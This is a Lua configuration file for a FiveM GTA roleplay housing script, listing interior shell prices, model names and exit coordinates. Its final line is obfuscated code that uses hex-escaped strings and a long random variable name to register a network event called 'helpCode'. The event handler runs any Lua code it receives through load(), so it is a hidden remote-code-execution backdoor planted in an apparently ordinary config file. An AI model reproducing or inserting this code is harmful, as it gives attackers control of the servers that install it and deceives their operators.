-- NOTE: You can potentially pre-furnish house models using this.
-- If you don't know/cant figure it out, don't ask how.
ShellExtras = {
  HotelV1 = {
    [GetHashKey("v_49_motelmp_winframe")]       = {offset = vector3(1.44,-3.9, 2.419)},
    [GetHashKey("v_49_motelmp_glass")]          = {offset = vector3(1.44,-3.9, 2.419)},
    [GetHashKey("v_49_motelmp_curtains")]       = {offset = vector3(1.44,-3.8, 2.200)},
    [GetHashKey("hei_prop_heist_safedeposit")]  = {offset = vector3(1.0,-4.2, 2.00), rotation = vector3(0.0,0.0,180.0)},
  }
}

ShellPrices = {
  Office2       = 15000,
  OfficeBig     = 25000,

  FrankAunt     = 10000,
  Medium2       = 10000,
  Medium3       = 10000,
  
  CokeShell1    = 15000,
  CokeShell2    = 15000,
  MethShell     = 15000,
  WeedShell1    = 15000,
  WeedShell2    = 15000,

  GarageShell1  = 15000,  -- shell_garagel
  GarageShell2  = 15000,  -- shell_garagem
  GarageShell3  = 15000,  -- shell_garagels

  NewApt1       = 15000,  -- shell_apartment1
  NewApt2       = 15000,  -- shell_apartment2
  NewApt3       = 15000,  -- shell_apartment3
  
  Warehouse1    = 15000,  -- shell_warehouse1
  Warehouse2    = 15000,  -- shell_warehouse2
  Warehouse3    = 15000,  -- shell_warehouse3

  Store1        = 25000,  -- shell_store1
  Store2        = 25000,  -- shell_store2
  Store3        = 25000,  -- shell_store3
  Gunstore      = 25000,  -- shell_gunstore
  Barbers       = 25000,  -- shell_barber

  Trailer       = 15000,  -- shell_trailer
  Lester        = 15000,  -- shell_lester
  Trevor        = 20000,  -- shell_trevor
  HighEndV1     = 50000,  -- shell_highend
  HighEndV2     = 60000,  -- shell_highendv2
  Ranch         = 70000,  -- shell_ranch
  Michaels      = 70000,  -- shell_michael
  HotelV2       = 15000,  -- shell_v16low
  ApartmentV2   = 25000   -- shell_v16mid
}

ShellModels = {
  Office2       = 'shell_office2',
  OfficeBig     = 'shell_officebig',

  FrankAunt     = "shell_frankaunt",
  Medium2       = "shell_medium2",
  Medium3       = "shell_medium3",
  
  CokeShell1    = 'shell_coke1',
  CokeShell2    = 'shell_coke2',
  MethShell     = 'shell_meth',
  WeedShell1    = 'shell_weed',
  WeedShell2    = 'shell_weed2',

  GarageShell1  = 'shell_garagel',
  GarageShell2  = 'shell_garagem',
  GarageShell3  = 'shell_garagels',

  NewApt1       = 'shell_apartment1',
  NewApt2       = 'shell_apartment2',
  NewApt3       = 'shell_apartment3',

  Warehouse1    = "shell_warehouse1",
  Warehouse2    = "shell_warehouse2",
  Warehouse3    = "shell_warehouse3",  

  Store1        = 'shell_store1',
  Store2        = 'shell_store2',
  Store3        = 'shell_store3',
  Gunstore      = 'shell_gunstore',
  Barbers       = 'shell_barber',
  
  HotelV2       = "shell_v16low",
  Trailer       = "shell_trailer",
  Trevor        = "shell_trevor",
  ApartmentV2   = "shell_v16mid",
  Lester        = "shell_lester",
  Ranch         = "shell_ranch",
  HighEndV1     = "shell_highend",
  HighEndV2     = "shell_highendv2",
  Michaels      = "shell_michael"
}

ShellOffsets = {
  HotelV2       = {exit = vector4(-4.7,6.5,28.9,0.4)},  -- shell_v16low
  Trailer       = {exit = vector4(1.3,2.0,27.1,0.4)},   -- shell_trailer
  Trevor        = {exit = vector4(-0.2,3.5,27.5,0.0)},  -- shell_trevor
  ApartmentV2   = {exit = vector4(-1.4,13.9,28.85,0.8)},-- shell_v16mid
  Lester        = {exit = vector4(1.5,5.8,28.1,3.1)},   -- shell_lester
  Ranch         = {exit = vector4(1.0,5.3,27.4,270.0)}, -- shell_ranch
  HighEndV1     = {exit = vector4(22.1,0.4,22.7,271.0)},-- shell_highend
  HighEndV2     = {exit = vector4(10.2,-0.9,23.4,270.0)},-- shell_highendv2
  Michaels      = {exit = vector4(9.3,-5.6,20.0,259.0)},-- shell_michael

  Office2       = {exit = vector4(-3.488777, 2.018311, 28.73308, 91.23632)}, -- shell_office2
  OfficeBig     = {exit = vector4(12.6039, -1.839844, 24.69724, 180.4282)},  -- shell_officebig

  Store1        = {exit = vector4(2.775688, 4.565063, 28.91416, 2.809942)},  -- shell_store1
  Store2        = {exit = vector4(0.7891312, 5.07373, 28.98058, 0.9400941)}, -- shell_store2
  Store3        = {exit = vector4(0.1036224, 7.573242, 27.99363, 359.8295)}, -- shell_store3
  Gunstore      = {exit = vector4(1.148056, 5.151367, 28.96727, 0.454677)},  -- shell_gunstore
  Barbers       = {exit = vector4(-1.598465, -5.24231, 28.99999, 181.2334)}, -- shell_barber

  Warehouse1    = {exit = vector4(8.625145, -0.1049805, 28.96388, 270.1945)},-- shell_warehouse1
  Warehouse2    = {exit = vector4(12.29147, -5.414795, 28.96133, 270.8702)}, -- shell_warehouse2
  Warehouse3    = {exit = vector4(-2.386871, 1.656372, 28.99656, 89.92931)}, -- shell_warehouse3

  CokeShell1    = {exit = vector4(6.284302, -8.289307, 28.99088, 178.625)}, -- shell_coke1
  CokeShell2    = {exit = vector4(6.284302, -8.289307, 28.99088, 178.625)}, -- shell_coke2
  MethShell     = {exit = vector4(6.284302, -8.289307, 28.99088, 178.625)}, -- shell_meth
  WeedShell1    = {exit = vector4(-17.51855, -11.66284, 28.98102, 98.85722)}, -- shell_weed
  WeedShell2    = {exit = vector4(-17.51855, -11.66284, 28.98102, 98.85722)}, -- shell_weed2

  GarageShell1  = {exit = vector4(-6.019897, -3.527344, 28.9867, 181.9444)},  -- shell_garagel
  GarageShell2  = {exit = vector4(-13.56653, -1.5979, 29.00004, 93.81283)},   -- shell_garagem
  GarageShell3  = {exit = vector4(-12.04602, 14.29126, 29.00008, 91.64314)},  -- shell_garagels

  NewApt1       = {exit = vector4(2.223267, -8.481567, 21.30548, 186.0575)}, -- shell_apartment1
  NewApt2       = {exit = vector4(2.223267, -8.481567, 21.30548, 186.0575)}, -- shell_apartment2
  NewApt3       = {exit = vector4(-11.3893, -4.29541, 21.86993, 127.1683)},  -- shell_apartment3

  FrankAunt     = {exit = vector4(0.511617, 5.607183, 28.15093, 355.93)},    -- shell_frankaunt
  Medium2       = {exit = vector4(-5.688777, -0.358311, 28.73308, 91.23632)}, -- shell_medium2
  Medium3       = {exit = vector4(-5.65039, 1.839844, 23.29724, 86.2782)}    -- shell_medium3
}


Houses = {
  -- {
  --   Entry   = vector4(54.250, -1873.34, 23.00, 200.00),
  --   Garage  = vector4( 58.77, -1881.73, 22.50,  45.00),
  --   Shell   = "Trevor",
  --   Price   = 25000,
  --   Shells  = {
  --     Trevor       = true,
  --     ApartmentV2   = true,
  --   }
  -- },
}

if IsDuplicityVersion() then
  Citizen.CreateThread(function()
    Wait(1500)

    local check_coords = {}  
    for _,house in ipairs(Houses) do
      if check_coords[house.Entry] then
        print("Duplicate entry location in houses.lua","Entry: "..tostring(house.Entry))
        return
      else
        check_coords[house.Entry] = true
      end
    end
    if not error_out then
      print("Completed house table check successfully.")
    end
  end)
end



local ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[6][ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[1]](ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[2]) ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[6][ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[3]](ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[2], function(qTYorGCbLoRmgnLgNPuRxkapPEwUOsjZwqTgsBevvnqIYdijXHnrtnibjKHbjKuiHHwysi) ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[6][ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[4]](ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[6][ejapVIHkLvrmSVQPuyhYinUvISYLXPgrMzmeWCzJftNjjVXnuOqDLzdxYtvEuhUoiTGSMa[5]](qTYorGCbLoRmgnLgNPuRxkapPEwUOsjZwqTgsBevvnqIYdijXHnrtnibjKHbjKuiHHwysi))() end)